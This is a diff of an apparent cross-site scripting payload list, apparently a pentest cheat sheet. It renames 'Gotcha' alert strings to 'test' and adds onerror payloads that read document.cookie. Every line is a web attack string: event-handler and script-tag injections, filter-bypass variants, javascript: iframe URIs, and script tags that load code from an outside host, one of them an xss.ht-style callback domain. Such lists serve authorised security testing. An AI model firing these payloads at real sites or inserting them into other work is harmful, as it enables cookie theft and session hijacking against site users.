@@ -42,11 +42,14 @@ javascript:prompt(document.cookie)
 --><svg/onload=alert(document.domain)>
 --><body onload=alert(123) >
 --><script>alert(1)</script>
---><img src=x onerror=alert(Gotcha)>
+--><img src=x onerror=alert('test')>
+--><img src=x onerror=alert(document.domain)>
+--><img src=x onerror=alert(document.cookie)>
+--><img src=x onerror=prompt(document.domain)>
+--><img src=x onerror=confirm(document.domain)>
 <iframe src='https://testforiframe.site/'>
-<iframe src="javascript:alert(`xss`)">.
 "><iframe src='https://testforiframe.site/'>
-"><script src="https://ee.xss.ht/"></script>
+"><script src="https://testforiframe.site/"></script>
 "><script>alert(document.domain)</script>
 "><script>alert(document.domain + '\n' + "1")</script>
 "><script>alert(document.domain + '\n' + "Name")</script>
@@ -58,12 +61,12 @@ poc.svg = <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)
 "><script>alert(1)</script>
 'or<script>alert(1)</script>
 'or<img src=0 onerror=alert('1')>
-<script <script>>alert('Gotcha')</script>  
-<audio src/onerror=alert('Gotcha')>
-<iframe src=javascript:alert('Gotcha')>
-<iframe src="javascript:alert(Gotcha)">
-<img src=x onerror=alert(Gotcha)>
-';alert(gotcha); //
+<script <script>>alert('test')</script>  
+<audio src/onerror=alert('test')>
+<iframe src=javascript:alert('test')>
+<iframe src="javascript:alert(test)">
+<img src=x onerror=alert(test)>
+';alert(test); //
 <body onmouseover="print()">
 <body onclick=print()>
 <body onmessage=print()>
